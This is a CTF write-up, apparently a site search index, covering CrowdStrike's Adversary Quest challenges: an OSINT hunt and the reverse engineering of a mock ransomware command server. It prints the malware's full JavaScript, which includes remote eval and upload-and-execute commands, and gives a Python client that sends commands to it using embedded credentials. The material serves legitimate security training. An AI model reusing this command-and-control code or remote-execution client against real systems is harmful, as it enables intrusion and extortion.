{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"CrowdStrike's Adversary Quest CTF # CrowdStrike's Adversary Quest CTF ran from January 18th to January 28th and featured a variety of challenges, from OSINT to binary exploitation. The CTF covered three adversaries, each with 4 challenges. I'll cover the five challenges I managed to solve in this writeup. The source to this write up, including scripts , is on my github . The adversaries are: SPACE JACKAL # Not to be confused with spaceflight enthusiasts, SPACE JACKAL have very strict opinions on source code indentation. Brought together by their unbounded hate for ASCII character 9, they will not rest until the last tab stop has been eradicated from the face of the Internet. The Proclamation Matrix Injector PROTECTIVE PENGUIN # An Antarctica-based APT with a counterintelligence mission. Born out of the necessity to protect their Antarctic colonies from discovery, sentient wildlife has acquired the technology and skill set that allows PROTECTIVE PENGUIN to target research institutes, cruise lines and satellite imagery providers. CATAPULT SPIDER # Rabid fans of the memetacular Doge and the associated crypto currency, CATAPULT SPIDER are trying to turn their obsession into a profit. Watch out for your cat pictures, lest CATAPULT SPIDER intrude your networks and extort them for Dogecoin. Much Sad Very Protocol","title":"Introduction"},{"location":"#crowdstrikes-adversary-quest-ctf","text":"CrowdStrike's Adversary Quest CTF ran from January 18th to January 28th and featured a variety of challenges, from OSINT to binary exploitation. The CTF covered three adversaries, each with 4 challenges. I'll cover the five challenges I managed to solve in this writeup. The source to this write up, including scripts , is on my github . The adversaries are:","title":"CrowdStrike's Adversary Quest CTF"},{"location":"#space-jackal","text":"Not to be confused with spaceflight enthusiasts, SPACE JACKAL have very strict opinions on source code indentation. Brought together by their unbounded hate for ASCII character 9, they will not rest until the last tab stop has been eradicated from the face of the Internet. The Proclamation Matrix Injector","title":"SPACE JACKAL"},{"location":"#protective-penguin","text":"An Antarctica-based APT with a counterintelligence mission. Born out of the necessity to protect their Antarctic colonies from discovery, sentient wildlife has acquired the technology and skill set that allows PROTECTIVE PENGUIN to target research institutes, cruise lines and satellite imagery providers.","title":"PROTECTIVE PENGUIN"},{"location":"#catapult-spider","text":"Rabid fans of the memetacular Doge and the associated crypto currency, CATAPULT SPIDER are trying to turn their obsession into a profit. Watch out for your cat pictures, lest CATAPULT SPIDER intrude your networks and extort them for Dogecoin. Much Sad Very Protocol","title":"CATAPULT SPIDER"},{"location":"conclusion/","text":"Conclusion # I enjoyed this CTF. It was a good mix of challenges: OSINT, reverse engineering, binary analysis. It did expose a few weaknesses in my tool belt, namely binary exploitation & overflows. I've got a long way to go and much to learn. Thank you to the team at CrowdStrike for putting this on. I hope this becomes an annual thing, as I'd like a shot at the adversaries again next year. PROTECTIVE PENGUIN will fall next time.","title":"Conclusion"},{"location":"conclusion/#conclusion","text":"I enjoyed this CTF. It was a good mix of challenges: OSINT, reverse engineering, binary analysis. It did expose a few weaknesses in my tool belt, namely binary exploitation & overflows. I've got a long way to go and much to learn. Thank you to the team at CrowdStrike for putting this on. I hope this becomes an annual thing, as I'd like a shot at the adversaries again next year. PROTECTIVE PENGUIN will fall next time.","title":"Conclusion"},{"location":"CatapultSpider/muchsad/","text":"CATAPULT SPIDER - Much Sad # This is an OSINT challenge: find the flag in the publically-available information CATAPULT SPIDER has left online. Challenge description # We have received some information that CATAPULT SPIDER has encrypted a client's cat pictures and successfully extorted them for a ransom of 1337 Dogecoin. The client has provided the ransom note, is there any way for you to gather more information about the adversary's online presence? NOTE: Flags will be easily identifiable by following the format CS{some_secret_flag_text} . They must be submitted in full, including the CS{ and } parts. Solution # We're given a file to download muchsad.txt : Two things jump out: a Dogecoin wallet address: DKaHBkfEJKef6r3L1SmouZZcxgkDPPgAoE and an email address shibegoodboi@protonmail.com . Plugging shibegoodboi into Google yields a few promising hits: a Twitter account https://twitter.com/shibegoodboi and a Reddit profile https://www.reddit.com/user/shibegoodboi/ . Visiting the Twitter page a link to a GitHub repository https://github.com/shibefan : In shibefan's repositories is one for https://shibefan.github.io . We can either browse through the repository and view the index.html of the page, or just visit https://shibefan.github.io : And there's the flag: CS{shibe_good_boi_doge_to_the_moon} Answer # CS{shibe_good_boi_doge_to_the_moon}","title":"Catapult Spider - Much Sad"},{"location":"CatapultSpider/muchsad/#catapult-spider-much-sad","text":"This is an OSINT challenge: find the flag in the publically-available information CATAPULT SPIDER has left online.","title":"CATAPULT SPIDER - Much Sad"},{"location":"CatapultSpider/muchsad/#challenge-description","text":"We have received some information that CATAPULT SPIDER has encrypted a client's cat pictures and successfully extorted them for a ransom of 1337 Dogecoin. The client has provided the ransom note, is there any way for you to gather more information about the adversary's online presence? NOTE: Flags will be easily identifiable by following the format CS{some_secret_flag_text} . They must be submitted in full, including the CS{ and } parts.","title":"Challenge description"},{"location":"CatapultSpider/muchsad/#solution","text":"We're given a file to download muchsad.txt : Two things jump out: a Dogecoin wallet address: DKaHBkfEJKef6r3L1SmouZZcxgkDPPgAoE and an email address shibegoodboi@protonmail.com . Plugging shibegoodboi into Google yields a few promising hits: a Twitter account https://twitter.com/shibegoodboi and a Reddit profile https://www.reddit.com/user/shibegoodboi/ . Visiting the Twitter page a link to a GitHub repository https://github.com/shibefan : In shibefan's repositories is one for https://shibefan.github.io . We can either browse through the repository and view the index.html of the page, or just visit https://shibefan.github.io : And there's the flag: CS{shibe_good_boi_doge_to_the_moon}","title":"Solution"},{"location":"CatapultSpider/muchsad/#answer","text":"CS{shibe_good_boi_doge_to_the_moon}","title":"Answer"},{"location":"CatapultSpider/veryprotocol/","text":"CATAPULT SPIDER - Very Protocol # We now have a copy of CATAPULT SPIDER's malware. Our task is to reverse engineer the protocol and retrieve the encryption key from the malware server. We're going down the Doge rabbit hole. Challenge description # We were approached by a CATAPULT SPIDER victim that was compromised and had all their cat pictures encrypted. Employee morale dropped to an all-time low. We believe that we identified a binary file that is related to the incident and is still running in the customer environment, accepting command and control traffic on veryprotocol.challenges.adversary.zone:41414 Can you help the customer recover the encryption key? Solution # Downloading the malware file, we see it's a farily large Linux binary: xps15$ ls -l malware -rwxr-xr-x 1 jra jra 48073657 Jan 20 07:41 malware* xps15$ file malware malware: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=101536e3a95f4d38ffb8627533070d093d1ee165, with debug_info, not stripped Running strings on the binary reveals the file contains much JavaScript code. The last string returned is <nexe~~sentinel> , which gives us a clue as to how the binary was built. nexe is a tool that packages Node.js files into a single executable for easy distrbution. Digging through the file with an editor such as vi , we can laboriously look through all of the JavaScript files embedded in the malware. One chunk, however, jumps out as suspicious: it's not JavaScript, but a language known as dogescript (of course). Pulling out the Dogescript files, we see that this is the main program of the malware (trimmed for length): so tls as tls so fs as fs so dogeon as dson so dogescript as dogescript so . / muchmysterious as mysterious so child_process as cp very cript_key is plz Math . random with & dose toString with 36 & dose substr with 2 15 rly process . env . CRYPTZ is undefined plz console . loge with 'no cryptz key. doge can not crypt catz.' process dose exit with 1 wow very secrit_key = plz cript with process . env . CRYPTZ cript_key process . env . CRYPTZ is 'you dnt git key' delete process . env . CRYPTZ next networker_file is fs dose readFileSync with './networker.djs' & dose toString with 'utf-8' very networker_doge is plz dogescript with networker_file very Networker is plz eval with networker_doge ... ( much code . such doge . wow ) const server = tls . createServer ( options , ( socket ) => { console . log ( 'doge connected: ' , socket . authorized ? 'TOP doge' : 'not top doge' ); let networker = new Networker ( socket , ( data ) => { very doge_lingo is data dose toString plz console . log with 'top doge sez:' doge_lingo very doge_woof is plz dogeParam with doge_lingo networker dose send with doge_woof networker . send ( dogeParam ( data . toString ())); }); //networker dose init with 'such doge is yes wow' 'such doge is shibe wow' }); server . listen ( 41414 , () => { plz console . loge with 'doge waiting for command from top doge' }); server . on ( 'connection' , function ( c ) { plz console . loge with 'doge connect' }); server . on ( 'secureConnect' , function ( c ) { plz console . loge with 'doge connect secure' }); And a module for the network protocol: so crypto as crypto classy Networker maker socket handler dis giv socket is socket dis giv _packet is {} dis giv _process is false dis giv _state is 'HEADER' dis giv _payloadLength is 0 dis giv _bufferedBytes is 0 dis giv queue is [] dis giv handler is handler wow next ... ( more code . shibe good boi .) _send (){ very contentLength is plz Buffer . allocUnsafe with 4 plz contentLength . writeUInt32BE with this . _packet . header . length plz this . socket . write with contentLength plz this . socket . write with this . _packet . message this . _packet is {} } next wow woof Networker Thankfully, we don't have to learn Dogescript to reverse engineer the malware. An online translator is available that will turn this into actual JavaScript. Running the Dogescript files through the translator provides more readable code: Main program 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 var tls = require ( 'tls' ); var fs = require ( 'fs' ); var dson = require ( 'dogeon' ); var dogescript = require ( 'dogescript' ); var mysterious = require ( './muchmysterious' ); var cp = require ( 'child_process' ); var cript_key = Math . random () . toString ( 36 ) . substr ( 2 , 15 ); if ( process . env . CRYPTZ === undefined ) { console . log ( 'no cryptz key. doge can not crypt catz.' ); process . exit ( 1 ); } var secrit_key = cript ( process . env . CRYPTZ , cript_key ); process . env . CRYPTZ = 'you dnt git key' ; delete process . env . CRYPTZ ; networker_file = fs . readFileSync ( './networker.djs' ) . toString ( 'utf-8' ); var networker_doge = dogescript ( networker_file ); var Networker = eval ( networker_doge ); function cript ( input , key ) { var c = Buffer . alloc ( input . length ); while ( key . length < input . length ) { key += key ; } var ib = Buffer . from ( input ); var kb = Buffer . from ( key ); for ( i = 0 ; i < input . length ; i ++ ) { c [ i ] = ib [ i ] ^ kb [ i ] } return c . toString (); } function dogeParam ( buffer ) { var doge_command = dson . parse ( buffer ); var doge_response = {}; if ( ! ( 'dogesez' in doge_command )) { doge_response [ 'dogesez' ] = 'bonk' ; doge_response [ 'shibe' ] = 'doge not sez' ; return dson . stringify ( doge_response ); } if ( doge_command . dogesez === 'ping' ) { doge_response [ 'dogesez' ] = 'pong' ; doge_response [ 'ohmaze' ] = doge_command . ohmaze ; } if ( doge_command . dogesez === 'do me a favor' ) { var favor = undefined ; var doge = undefined ; try { doge = dogescript ( doge_command . ohmaze ); favor = eval ( doge ); doge_response [ 'dogesez' ] = 'welcome' ; doge_response [ 'ohmaze' ] = favor ; } catch { doge_response [ 'dogesez' ] = 'bonk' ; doge_response [ 'shibe' ] = 'doge sez no' ; } } if ( doge_command . dogesez === 'corn doge' ) { if (( ! ( 'batter' in doge_command ) || ! ( 'sausage' in doge_command ))) { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'corn doge no batter or sausage' ; return dson . stringify ( doge_response ); } if (( ! ( 'meat' in doge_command [ 'sausage' ]) || ! ( 'flavor' in doge_command [ 'sausage' ]))) { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'sausage no meat or flavor' ; return dson . stringify ( doge_response ); } var stupid = Array . isArray ( doge_command [ 'sausage' ][ 'flavor' ]); if ( ! stupid ) { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'flavor giv not levl' ; return dson . stringify ( doge_response ); } var stupidtoo = Buffer . from ( doge_command . batter , 'base64' ) . toString ( 'base64' ); if ( stupidtoo === doge_command . batter ) { doge_response [ 'dogesez' ] = 'eated' ; var meat = doge_command [ 'sausage' ][ 'meat' ]; var flavor = doge_command [ 'sausage' ][ 'flavor' ]; var doge_carnval = Buffer . from ( doge_command . batter , 'base64' ); var randome = Math . random () . toString ( 36 ) . substr ( 2 , 9 ) var filename = '/tmp/corndoge-' + randome + '.node' ; fs . writeFileSync ( filename , doge_carnval ); try { var doge_module = require ( '' + filename + '' ); var retval = doge_module [ meat ](... flavor ); doge_response [ 'taste' ] = retval ; } catch { doge_response [ 'dogesez' ] = 'bonk' ; doge_response [ 'shibe' ] = 'bad corn doge' ; } finally { delete require . cache [ require . resolve ( filename )] }; } else { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'all bout base six fur' ; } } if ( doge_command . dogesez === 'hot doge' ) { if (( ! ( 'bread' in doge_command ) || ! ( 'sausage' in doge_command ))) { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'hot doge no bread or sausage' ; return dson . stringify ( doge_response ); } if ( ! 'flavor' in doge_command [ 'sausage' ]) { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'sausage no flavor' ; return dson . stringify ( doge_response ); } var stupid = Array . isArray ( doge_command [ 'sausage' ][ 'flavor' ]); if ( ! stupid ) { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'flavor giv not levl' ; return dson . stringify ( doge_response ); } var stupidtoo = Buffer . from ( doge_command . bread , 'base64' ) . toString ( 'base64' ); if ( stupidtoo === doge_command . bread ) { doge_response [ 'dogesez' ] = 'eated' ; var flavor = doge_command [ 'sausage' ][ 'flavor' ]; var doge_carnval = Buffer . from ( doge_command . bread , 'base64' );; var randome = Math . random () . toString ( 36 ) . substr ( 2 , 9 ) var filename = '/tmp/hotdoge-' + randome + '.bin' ; fs . writeFileSync ( filename , doge_carnval ); fs . chmodSync ( filename , '755' ); try { var retval = cp . execFileSync ( filename , flavor ); doge_response [ 'taste' ] = retval . toString ( 'utf-8' ); } catch ( error ) { if ( 'status' in error ) { doge_response [ 'dogesez' ] = 'eated' ; var errstd = error . stdout . toString ( 'utf-8' ); var errerr = error . stderr . toString ( 'utf-8' ); doge_response [ 'taste' ] = errstd ; doge_response [ 'error' ] = errerr ; if ( error . status === 27 ) { doge_response [ 'shibe' ] = 'wow such module thx top doge' ; } } else { doge_response [ 'dogesez' ] = 'bonk' ; doge_response [ 'shibe' ] = 'bad hot doge' ; } } finally { delete require . cache [ require . resolve ( filename )] }; } else { doge_response [ 'dogesez' ] = 'dnt cunsoome' ; doge_response [ 'shibe' ] = 'all bout base six fur' ; } } return dson . stringify ( doge_response ); } const options = { key : servs_key , cert : servs_cert , requestCert : true , rejectUnauthorized : true , ca : [ doge_ca ] }; const server = tls . createServer ( options , ( socket ) => { console . log ( 'doge connected: ' , socket . authorized ? 'TOP doge' : 'not top doge' ); let networker = new Networker ( socket , ( data ) => { var doge_lingo = data . toString (); // console.log('top doge sez:', doge_lingo); var doge_woof = dogeParam ( doge_lingo ); networker . send ( doge_woof ); // networker.send(dogeParam(data.toString())); }); networker . init ( 'such doge is yes wow' , 'such doge is shibe wow' ); }); server . listen ( 41414 , () => { console . log ( 'doge waiting for command from top doge' ); }); server . on ( 'connection' , function ( c ) { console . log ( 'doge connect' ); }); server . on ( 'secureConnect' , function ( c ) { console . log ( 'doge connect secure' ); }); Network protocol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 var crypto = require ( 'crypto' ); class Networker { constructor ( socket , handler ) { this . socket = socket ; this . _packet = {}; this . _process = false ; this . _state = 'HEADER' ; this . _payloadLength = 0 ; this . _bufferedBytes = 0 ; this . queue = []; this . handler = handler ; }; init ( hmac_key , aes_key ) { var salty_wow = 'suchdoge4evawow' ; this . hmac_key = crypto . pbkdf2Sync ( hmac_key , salty_wow , 4096 , 16 , 'sha256' ); this . aes_key = crypto . pbkdf2Sync ( aes_key , salty_wow , 4096 , 16 , 'sha256' ); var f1 = ( data ) => { this . _bufferedBytes += data . length ; this . queue . push ( data ); this . _process = true ; this . _onData (); }; this . socket . on ( 'data' , f1 ); this . socket . on ( 'error' , function ( err ) { console . log ( 'Socket not shibe: ' , err ); }); var dis_handle = this . handler ; this . socket . on ( 'served' , dis_handle ); }; _hasEnough ( size ) { if ( this . _bufferedBytes >= size ) { return true ; } this . _process = false ; return false ; }; _readBytes ( size ) { let result ; this . _bufferedBytes -= size ; if ( size === this . queue [ 0 ]. length ) { return this . queue . shift (); } if ( size < this . queue [ 0 ]. length ) { result = this . queue [ 0 ]. slice ( 0 , size ); this . queue [ 0 ] = this . queue [ 0 ]. slice ( size ); return result ; } result = Buffer . allocUnsafe ( size ); let offset = 0 ; let length ; while ( size > 0 ) { length = this . queue [ 0 ]. length ; if ( size >= length ) { this . queue [ 0 ]. copy ( result , offset ); offset += length ; this . queue . shift (); } else { this . queue [ 0 ]. copy ( result , offset , 0 , size ); this . queue [ 0 ] = this . queue [ 0 ]. slice ( size ); } size -= length ; } return result ; }; _getHeader () { let stupid = this . _hasEnough ( 4 ); if ( stupid ) { this . _payloadLength = this . _readBytes ( 4 ). readUInt32BE ( 0 , true ); this . _state = 'PAYLOAD' ; } }; _getPayload () { let stupid = this . _hasEnough ( this . _payloadLength ); if ( stupid ) { let received = this . _readBytes ( this . _payloadLength ); this . _parseMessage ( received ); this . _state = 'HEADER' ; } }; _onData ( data ) { while ( this . _process ) { if ( this . _state === 'HEADER' ) { this . _getHeader (); } if ( this . _state === 'PAYLOAD' ) { this . _getPayload (); } } }; _encrypt ( data ) { var iv = Buffer . alloc ( 16 , 0 ); var wow_cripter = crypto . createCipheriv ( 'aes-128-cbc' , this . aes_key , iv ); wow_cripter . setAutoPadding ( true ); return Buffer . concat ([ wow_cripter . update ( data ), wow_cripter . final ()]); }; _decrypt ( data ) { var iv = Buffer . alloc ( 16 , 0 ); var wow_decripter = crypto . createDecipheriv ( 'aes-128-cbc' , this . aes_key , iv ); wow_decripter . setAutoPadding ( true ); return Buffer . concat ([ wow_decripter . update ( data ), wow_decripter . final ()]); }; send ( message ) { let hmac = crypto . createHmac ( 'sha256' , this . hmac_key ); let mbuf = this . _encrypt ( message ); hmac . update ( mbuf ); let chksum = hmac . digest (); let buffer = Buffer . concat ([ chksum , mbuf ]); this . _header ( buffer . length ); this . _packet . message = buffer ; this . _send (); }; _parseMessage ( received ) { var hmac = crypto . createHmac ( 'sha256' , this . hmac_key ); var checksum = received . slice ( 0 , 32 ) . toString ( 'hex' ); var message = received . slice ( 32 ); hmac . update ( message ); let stupid = hmac . digest ( 'hex' ); if ( checksum === stupid ) { var dec_message = this . _decrypt ( message ); this . socket . emit ( 'served' , dec_message ); } }; _header ( messageLength ) { this . _packet . header = { length : messageLength }; }; _send () { var contentLength = Buffer . allocUnsafe ( 4 ); contentLength . writeUInt32BE ( this . _packet . header . length ); this . socket . write ( contentLength ); this . socket . write ( this . _packet . message ); this . _packet = {}; }; } module . exports = Networker Also inside the malware is an embedded client certificate and RSA private key, which are needed to authenticate against the malware server. Digging into the start of the main program, we see the method used to generate the key: 8 9 10 11 12 13 14 15 16 17 18 var cript_key = Math . random () . toString ( 36 ) . substr ( 2 , 15 ); if ( process . env . CRYPTZ === undefined ) { console . log ( 'no cryptz key. doge can not crypt catz.' ); process . exit ( 1 ); } var secrit_key = cript ( process . env . CRYPTZ , cript_key ); process . env . CRYPTZ = 'you dnt git key' ; delete process . env . CRYPTZ ; A random cript_key is generated, then passed to the cript() function along with the contents of the environment variable CRYPTZ , the result of which is stored in secrit_key . The CRYPTZ environment variable is then set to a value ( you dnt get key ), then deleted from memory, presumably in an attempt to prevent it's content from being discovered by memory forensics. However, the same process is not performed on on the cript_key variable, which will be important later. The cript() function is a simple XOR of the two arguments: 24 25 26 27 28 29 30 31 32 33 34 35 function cript ( input , key ) { var c = Buffer . alloc ( input . length ); while ( key . length < input . length ) { key += key ; } var ib = Buffer . from ( input ); var kb = Buffer . from ( key ); for ( i = 0 ; i < input . length ; i ++ ) { c [ i ] = ib [ i ] ^ kb [ i ] } return c . toString (); } Continuing through the program, we see a function that parses commands sent to the server: 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 function dogeParam ( buffer ) { var doge_command = dson . parse ( buffer ); var doge_response = {}; if ( ! ( 'dogesez' in doge_command )) { doge_response [ 'dogesez' ] = 'bonk' ; doge_response [ 'shibe' ] = 'doge not sez' ; return dson . stringify ( doge_response ); } if ( doge_command . dogesez === 'ping' ) { doge_response [ 'dogesez' ] = 'pong' ; doge_response [ 'ohmaze' ] = doge_command . ohmaze ; } if ( doge_command . dogesez === 'do me a favor' ) { var favor = undefined ; var doge = undefined ; try { doge = dogescript ( doge_command . ohmaze ); favor = eval ( doge ); doge_response [ 'dogesez' ] = 'welcome' ; doge_response [ 'ohmaze' ] = favor ; } catch { doge_response [ 'dogesez' ] = 'bonk' ; doge_response [ 'shibe' ] = 'doge sez no' ; } } ... The function is passed a buffer containing a command string, which is encoded as DSON , or Doge Serialized Object Notation (sigh). The malware is using the dogeon serializer to parse the requests from the client. Commands from the client are passed as the value of the dogesez attribute. There are many different commands, but the important one is 'do me a favor' , which runs a Dogescript and returns the result to the caller. We can also perform a 'ping' to the server to check that our messages are being received correctly. The remaining commands deal with encrypting files sent to the server, but for the purposes of this CTF aren't necessary. At the end of the main program is the code that handles connections from the client: 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 const options = { key : servs_key , cert : servs_cert , requestCert : true , rejectUnauthorized : true , ca : [ doge_ca ] }; const server = tls . createServer ( options , ( socket ) => { console . log ( 'doge connected: ' , socket . authorized ? 'TOP doge' : 'not top doge' ); let networker = new Networker ( socket , ( data ) => { var doge_lingo = data . toString (); // console.log('top doge sez:', doge_lingo); var doge_woof = dogeParam ( doge_lingo ); networker . send ( doge_woof ); // networker.send(dogeParam(data.toString())); }); networker . init ( 'such doge is yes wow' , 'such doge is shibe wow' ); }); server . listen ( 41414 , () => { console . log ( 'doge waiting for command from top doge' ); }); server . on ( 'connection' , function ( c ) { console . log ( 'doge connect' ); }); server . on ( 'secureConnect' , function ( c ) { console . log ( 'doge connect secure' ); }); The tls.createServer function creates a server to receive requests. The options specify that the server will request a certificate from the client, and will reject any connections from clients that don't. Finally, the data is passed through a networker object, defined in the Network protocol above. We see the init method of the networker object is called with two strings: such doge is yes wow and such doge is dhibe wow . These phrases are combined with the salt suchdoge4evawow to create two keys: 1 for an HMAC algorithm, and one for AES encryption. 16 17 18 19 init ( hmac_key , aes_key ) { var salty_wow = 'suchdoge4evawow' ; this . hmac_key = crypto . pbkdf2Sync ( hmac_key , salty_wow , 4096 , 16 , 'sha256' ); this . aes_key = crypto . pbkdf2Sync ( aes_key , salty_wow , 4096 , 16 , 'sha256' ); The encryption method used is AES, in CBC-128 mode: 100 101 102 103 104 105 106 107 108 109 110 111 _encrypt ( data ) { var iv = Buffer . alloc ( 16 , 0 ); var wow_cripter = crypto . createCipheriv ( 'aes-128-cbc' , this . aes_key , iv ); wow_cripter . setAutoPadding ( true ); return Buffer . concat ([ wow_cripter . update ( data ), wow_cripter . final ()]); }; _decrypt ( data ) { var iv = Buffer . alloc ( 16 , 0 ); var wow_decripter = crypto . createDecipheriv ( 'aes-128-cbc' , this . aes_key , iv ); wow_decripter . setAutoPadding ( true ); return Buffer . concat ([ wow_decripter . update ( data ), wow_decripter . final ()]); }; The meat of the network protocl is in the send() and _send() methods: 112 113 114 115 116 117 118 119 120 121 send ( message ) { let hmac = crypto . createHmac ( 'sha256' , this . hmac_key ); let mbuf = this . _encrypt ( message ); hmac . update ( mbuf ); let chksum = hmac . digest (); let buffer = Buffer . concat ([ chksum , mbuf ]); this . _header ( buffer . length ); this . _packet . message = buffer ; this . _send (); }; 139 140 141 142 143 144 145 _send () { var contentLength = Buffer . allocUnsafe ( 4 ); contentLength . writeUInt32BE ( this . _packet . header . length ); this . socket . write ( contentLength ); this . socket . write ( this . _packet . message ); this . _packet = {}; }; The message is encrypted with the AES keys created in init() method, then an HMAC of the encrypted content is generated and is prepended to the message. The message is actually sent in the _send() method, which first writes an unsigned 32-bit number containing the length of the message to the socket, then the message itself. Incoming messages are handled in reverse, in the _parseMessage() function. The checksum passed with the message is stripped from the beginning, a new checksum is generated to compare against the received one, and if the checksums match, the message is decrypted and returned to the server. 122 123 124 125 126 127 128 129 130 131 132 133 _parseMessage ( received ) { var hmac = crypto . createHmac ( 'sha256' , this . hmac_key ); var checksum = received . slice ( 0 , 32 ) . toString ( 'hex' ); var message = received . slice ( 32 ); hmac . update ( message ); let stupid = hmac . digest ( 'hex' ); if ( checksum === stupid ) { var dec_message = this . _decrypt ( message ); this . socket . emit ( 'served' , dec_message ); } }; With all of these pieces, we can build a Python script to emulate the malware's communication with the server: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 #!/usr/bin/env python3 # CATAPULT SPIDER malware protocol # # Joe Ammond (pugpug) @joeammond import sys from pwn import * from Crypto.Protocol.KDF import PBKDF2 from Crypto.Hash import SHA512 , SHA256 , HMAC from Crypto.Random import get_random_bytes from Crypto.Cipher import AES # Create the HMAC and AES keys salty_wow = 'suchdoge4evawow' hmac_wow = 'such doge is yes wow' aes_wow = 'such doge is shibe wow' hmac_key = PBKDF2 ( hmac_wow , salty_wow , 16 , count = 4096 , hmac_hash_module = SHA256 ) aes_key = PBKDF2 ( aes_wow , salty_wow , 16 , count = 4096 , hmac_hash_module = SHA256 ) # Who we communicate with host = 'veryprotocol.challenges.adversary.zone' # Client certificate and private key, from the malware executable ssl_opts = { 'keyfile' : 'doge_key' , 'certfile' : 'doge_cert' , } # Encrypt the message, and prepend the HMAC def encrypt ( data ): iv = b ' \\0 ' * 16 cipher = AES . new ( aes_key , AES . MODE_CBC , iv = iv ) length = 16 - ( len ( data ) % 16 ) data += bytes ([ length ]) * length enc = cipher . encrypt ( data ) hmac = HMAC . new ( hmac_key , digestmod = SHA256 ) hmac . update ( enc ) digest = hmac . digest () return ( digest + enc ) # Decrypt the message, and verify that the HMAC matches def decrypt ( data ): checksum = data [: 32 ] . hex () message = data [ 32 :] hmac = HMAC . new ( hmac_key , digestmod = SHA256 ) hmac . update ( message ) verify = hmac . hexdigest () if checksum == verify : iv = b ' \\0 ' * 16 cipher = AES . new ( aes_key , AES . MODE_CBC , iv = iv ) plaintext = cipher . decrypt ( message ) return ( plaintext ) else : return 'bonk' # Main loop: read a DSON string, encrypt it, send it to the server, # receive the response, print it. while True : # Read a string command = bytes ( input ( 'Shibe sez? ' ) . strip (), 'utf-8' ) # Shibe sez quit if command == 'quit' : sys . exit ( 0 ) # Connect to the server r = remote ( host , 41414 , ssl = True , ssl_args = ssl_opts ) # Encrypt it ciphertext = encrypt ( command ) # Send the message length as u32, then the message length = p32 ( len ( ciphertext ), endianness = \"big\" , sign = \"unsigned\" ) r . send ( length ) r . send ( ciphertext ) # Read the response length, and the message length = r . recv ( 4 ) response = r . recvall ( timeout = 5 ) r . close () # Decrypt the message and print it plaintext = decrypt ( response ) print ( plaintext ) print () The code is fairly straightforward. To retrieve the key from the server, we can use the cript() function with the cript_key value generated by the server. Running XOR on the secrit_key with the cript_key reverses the \"encryption\", revealing the original value of the CRYPTZ environment variable: (pwn) xps15$ python3 hammer.py Shibe sez? such \"dogesez\" is \"do me a favor\" next \"ohmaze\" is \"cript(secrit_key, cript_key)\" wow [+] Opening connection to veryprotocol.challenges.adversary.zone on port 41414: Done [+] Receiving all data: Done (128B) [*] Closed connection to veryprotocol.challenges.adversary.zone port 41414 b'such \"dogesez\" is \"welcome\" next \"ohmaze\" is \"CS{such_Pr0t0_is_n3tw0RkS_w0W}\" wow\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f\\x0f' And there's the flag: CS{such_Pr0t0_is_n3tw0RkS_w0W}. Answer # CS{such_Pr0t0_is_n3tw0RkS_w0W}","title":"Catapult Spider - Very Protocol"},{"location":"CatapultSpider/veryprotocol/#catapult-spider-very-protocol","text":"We now have a copy of CATAPULT SPIDER's malware. Our task is to reverse engineer the protocol and retrieve the encryption key from the malware server. We're going down the Doge rabbit hole.","title":"CATAPULT SPIDER - Very Protocol"},{"location":"CatapultSpider/veryprotocol/#challenge-description","text":"We were approached by a CATAPULT SPIDER victim that was compromised and had all their cat pictures encrypted. Employee morale dropped to an all-time low. We believe that we identified a binary file that is related to the incident and is still running in the customer environment, accepting command and control traffic on veryprotocol.challenges.adversary.zone:41414 Can you help the customer recover the encryption key?","title":"Challenge description"},{"location":"CatapultSpider/veryprotocol/#solution","text":"Downloading the malware file, we see it's a farily large Linux binary: xps15$ ls -l malware -rwxr-xr-x 1 jra jra 48073657 Jan 20 07:41 malware* xps15$ file malware malware: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), dynamically 